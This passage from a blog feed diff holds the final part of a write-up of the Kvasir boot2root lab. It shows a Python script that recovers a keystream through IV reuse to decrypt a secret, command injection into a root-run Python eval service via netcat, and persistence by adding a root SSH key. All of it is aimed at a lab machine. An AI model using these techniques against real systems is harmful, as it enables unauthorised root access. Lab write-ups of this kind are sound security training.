-        print &#39;[+] Matched Cypher Text: %s&#39; % cy
-
-        # first XOR to get the keystream for this IV
-        keystream = &#39;&#39;.join(chr(ord(a) ^ ord(b)) for a,b in zip(cy.decode(&amp;quot;hex&amp;quot;),&#39;B&#39;*24))
-        print &#39;[+] Keystream: %s&#39; % keystream.encode(&amp;quot;hex&amp;quot;)
-
-        # then decode second cypher text using the keystream for the cleartext
-        decrypted = &#39;&#39;.join(chr(ord(a) ^ ord(b)) for a,b in zip((iv_dict[iv]).decode(&amp;quot;hex&amp;quot;),keystream))
-        print &#39;[+] Decrytped flag is: %s&#39; % decrypted
-        break
-
-    # progress incase things take longer than expected
-    if count % 100000 == 0:
-        print &#39;[+] Tries: %d&#39; % count
-
-print &#39;[+] Done&#39;
-sock.close()
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;In no time at all, the above code outputs the decrypted flag:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# proxychains ./un_wep.py
-ProxyChains-3.1 (http://proxychains.sf.net)
-[+] Generating base iv:cy dictionary
-[+] The iv_dict knows about 5000 combinations
-[+] Starting Bruteforce with &#39;B&#39; *24
-[+] Frame matched IV of 06f39e in 1696 tries!
-[+] Base Cyper Text was: 02bf9ad2d5629c9f530b39a6
-[+] Matched Cypher Text: 70aaeec5a156a99a251e4ab2217436ae08a64b5ce0c21c9c
-[+] Keystream: 32e8ac87e314ebd8675c08f0633674ec4ae4091ea2805ede
-[+] Decrytped flag is: 0W6U6vwG4W1V
-[+] Done
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&lt;code&gt;0W6U6vwG4W1V&lt;/code&gt;. Seriously. All that work for another string. :( I immediately started to doubt if I nailed this. I tested this as the root password for all the previous machines I have not been root on yet to no avail. Then, I looked at the clock as saw it was 3am&amp;hellip; bed time for me!!&lt;/p&gt;
-
-&lt;h2 id=&#34;finally-getting-the-flag-sort-of&#34;&gt;finally getting the flag, sort of&amp;hellip;&lt;/h2&gt;
-
-&lt;p&gt;I woke up 7am, immediately thinking about this small string and the amount of work that went into getting it. I double checked my theory and script to make sure I am not missing something, but everything seemed to look fine.&lt;/p&gt;
-
-&lt;p&gt;After a breath of fresh air, I reconnected to the game and slapped the string in and pressed enter:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# proxychains nc -v 127.0.0.1 1234
-ProxyChains-3.1 (http://proxychains.sf.net)
-127.0.0.1: inverse host lookup failed:
-(UNKNOWN) [127.0.0.1] 1234 (?) open : Operation now in progress
-=============================
-Can you retrieve my secret..?
-=============================
-
-Usage:
-&#39;V&#39; to view the encrypted flag
-&#39;E&#39; to encrypt a plaintext string (e.g. &#39;E AAAA&#39;)
-
-0W6U6vwG4W1V
-&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Wut. Ok, so I have a &lt;em&gt;thing&lt;/em&gt; now. It didn’t accept anything I was typing into it. Everything just came back with another &lt;code&gt;&amp;gt;&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;&amp;gt; ls
-&amp;gt; id
-&amp;gt; whoami
-&amp;gt; ls -lah
-&amp;gt; uname -a
-&amp;gt; help
-&amp;gt; ?
-&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;I disconnected from the netcat session and tabbed back to the session where the &lt;code&gt;/opt/wep2.py&lt;/code&gt; script is started. Immediately it became clear what was going on:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;kefka@adm:~$ sudo /opt/wep2.py
-Traceback (most recent call last):
-  File &amp;quot;&amp;lt;string&amp;gt;&amp;quot;, line 1, in &amp;lt;module&amp;gt;
-NameError: name &#39;ls&#39; is not defined
-Traceback (most recent call last):
-  File &amp;quot;&amp;lt;string&amp;gt;&amp;quot;, line 1, in &amp;lt;module&amp;gt;
-NameError: name &#39;whoami&#39; is not defined
-Traceback (most recent call last):
-  File &amp;quot;&amp;lt;string&amp;gt;&amp;quot;, line 1, in &amp;lt;module&amp;gt;
-NameError: name &#39;ls&#39; is not defined
-Traceback (most recent call last):
-  File &amp;quot;&amp;lt;string&amp;gt;&amp;quot;, line 1, in &amp;lt;module&amp;gt;
-NameError: name &#39;uname&#39; is not defined
-  File &amp;quot;&amp;lt;string&amp;gt;&amp;quot;, line 1
-    ?
-    ^
-SyntaxError: invalid syntax
-Traceback (most recent call last):
-  File &amp;quot;/opt/wep2.py&amp;quot;, line 94, in &amp;lt;module&amp;gt;
-    handler(sock, addr)
-  File &amp;quot;/opt/wep2.py&amp;quot;, line 74, in handler
-    sock.send(p1)
-socket.error: [Errno 32] Broken pipe
-kefka@adm:~$
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;It seems like I have a kind of python shell? After a bit of fiddling around, I eventually started getting something usefull out of it:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;0W6U6vwG4W1V
-&amp;gt; import os; os.system(&#39;id&#39;);
-uid=0(root) gid=0(root) groups=0(root)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Yay :) I went straight for the &lt;code&gt;cat /root/flag&lt;/code&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;&amp;gt; import os; os.system(&#39;cat /root/flag&#39;);
-    _  __                             _
-   | |/ /   __ __   __ _     ___     (_)      _ _
-   | &#39; &amp;lt;    \ I /  / _` |   (_-&amp;lt;     | |     | &#39;_|
-   |_|\_\   _\_/_  \__,_|   /__/_   _|_|_   _|_|_
-  _|&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;|_|&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;|_|&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;|_|&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;|_|&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;|_|&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;|
-  &amp;quot;`-0-0-&#39;&amp;quot;`-0-0-&#39;&amp;quot;`-0-0-&#39;&amp;quot;`-0-0-&#39;&amp;quot;`-0-0-&#39;&amp;quot;`-0-0-&#39;
-
-Pbatenghyngvbaf ba orngvat Xinfve - V ubcr lbh rawblrq
-gur evqr.  Gnxr uvf oybbq, zvk jvgu ubarl naq qevax
-gur Zrnq bs Cbrgel...
-
-Ovt fubhg bhg gb zl orgn grfgref: @oneeronf naq @GurPbybavny.
-Fcrpvny gunaxf gb Onf sbe uvf cngvrapr qhevat guvf raqrnibhe.
-
-Srry serr gb cvat zr jvgu gubhtugf/pbzzragf ba
-uggc://jv-sh.pb.hx, #IhyaUho VEP be Gjvggre.
-
-  enfgn_zbhfr(@_EnfgnZbhfr)
-&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Err, oh &lt;a href=&#34;https://twitter.com/_RastaMouse&#34;&gt;@_RastaMouse&lt;/a&gt; you!! What is this? I figured I need to get a proper shell going to make life a little easier for myself. I did this by using the command execution we have now to prepare a authorized_keys file for root for me, adding the public key of the key pair I initially created. Then, finally, I SSH&amp;rsquo;d in as root:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# proxychains ssh root@127.0.0.1 -i kvasir_key
-ProxyChains-3.1 (http://proxychains.sf.net)
-Linux adm 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-Last login: Sun Nov  9 16:57:16 2014 from localhost
-root@adm:~#
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&#34;the-final-troll&#34;&gt;the final troll&lt;/h2&gt;
-
-&lt;p&gt;With the &lt;code&gt;/root/flag&lt;/code&gt; in a really strange format, I poked around a little to see what is going on. Eventually I went down to a python shell, loaded the flag and fiddled with &lt;code&gt;decode()&lt;/code&gt; again:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@adm:~# python
-Python 2.7.3 (default, Mar 13 2014, 11:03:55)
-[GCC 4.7.2] on linux2
-Type &amp;quot;help&amp;quot;, &amp;quot;copyright&amp;quot;, &amp;quot;credits&amp;quot; or &amp;quot;license&amp;quot; for more information.
-&amp;gt;&amp;gt;&amp;gt; with open(&#39;/root/flag&#39;) as f:
-...     flag = f.read()
-...
-&amp;gt;&amp;gt;&amp;gt; print flag.decode(&#39;rot13&#39;)
-    _  __                             _
-   | |/ /   __ __   __ _     ___     (_)      _ _
-   | &#39; &amp;lt;    \ V /  / _` |   (_-&amp;lt;     | |     | &#39;_|
-   |_|\_\   _\_/_  \__,_|   /__/_   _|_|_   _|_|_
-  _|&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;|_|&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;|_|&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;|_|&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;|_|&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;|_|&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;|
-  &amp;quot;`-0-0-&#39;&amp;quot;`-0-0-&#39;&amp;quot;`-0-0-&#39;&amp;quot;`-0-0-&#39;&amp;quot;`-0-0-&#39;&amp;quot;`-0-0-&#39;
-
-Congratulations on beating Kvasir - I hope you enjoyed
-the ride.  Take his blood, mix with honey and drink
-the Mead of Poetry...
-
-Big shout out to my beta testers: @barrebas and @TheColonial.
-Special thanks to Bas for his patience during this endeavour.
-
-Feel free to ping me with thoughts/comments on
-http://wi-fu.co.uk, #VulnHub IRC or Twitter.
-
-  rasta_mouse(@_RastaMouse)
-
-&amp;gt;&amp;gt;&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&#34;conclusion&#34;&gt;conclusion&lt;/h2&gt;
-
-&lt;p&gt;Wow. I actually can&amp;rsquo;t describe how tired I am now haha. From both doing Kvasir and taking almost a full day for this writeup :D However, this is most definitely one of my most favorite boot2roots out there thus far!&lt;/p&gt;
-
-&lt;p&gt;Many many thanks to &lt;a href=&#34;https://twitter.com/_RastaMouse&#34;&gt;@_RastaMouse&lt;/a&gt; for putting together this polished piece of work and &lt;a href=&#34;https://twitter.com/VulHub&#34;&gt;@VulnHub&lt;/a&gt; for the hosting!&lt;/p&gt;
 </description>
     </item>
     
